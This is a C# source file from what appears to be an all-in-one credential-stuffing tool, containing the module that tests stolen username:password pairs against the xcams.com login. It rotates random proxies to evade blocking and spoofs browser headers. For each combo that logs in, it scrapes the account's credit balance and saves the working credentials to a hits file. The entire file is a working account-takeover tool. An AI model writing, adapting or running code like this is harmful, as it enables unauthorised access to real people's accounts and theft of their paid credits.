using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;


namespace Xcams
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36";
                            httpRequest.IgnoreProtocolErrors = true;
                            httpRequest.AllowAutoRedirect = true;
                            httpRequest.AddHeader("origin", "https://www.xcams.com");
                            httpRequest.AddHeader("referer", "https://www.xcams.com/1/?_locale=en");
                            httpRequest.AddHeader("sec-fetch-dest", "empty");
                            httpRequest.AddHeader("sec-fetch-mode", "cors");
                            httpRequest.AddHeader("ec-fetch-site", "same-origin");
                            httpRequest.AddHeader("x-requested-with", "XMLHttpRequest");
                            string str = "username=" + s[0] + "&password=" + s[1];
                            httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                            new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                            string strResponse = httpRequest.Post("https://www.xcams.com/secure/login.do", str, "application/x-www-form-urlencoded").ToString();
                            {
                                if (strResponse.Contains("success\":false") || strResponse.Contains("Invalid email\\/password combination"))
                                {
                                    break;
                                }
                                else if (strResponse.Contains("200"))
                                {
                                    break;
                                }
                                else if (strResponse.Contains("success\":true"))
                                {
                                    string cap = httpRequest.Get("https://www.xcams.com/1/", null).ToString();
                                    string credits = Check.Parse(cap, "<span class='header__credits-number js-number-credits'>", "</span>");
                                    ZeusAIO.mainmenu.hits++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[HIT - XCAMS] " + s[0] + ":" + s[1] + " | Credits: " + credits, Color.Green);
                                    }
                                    Export.AsResult("/Xcams_hits", s[0] + ":" + s[1] + " | Credits: " + credits);
                                    return false;
                                }
                                else
                                {
                                    ZeusAIO.mainmenu.errors++;
                                    goto Retry;
                                }
                            }
                            break;
                        }
                    }
                    catch (Exception ex)
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }
    
        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] { left }, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }
    }
}
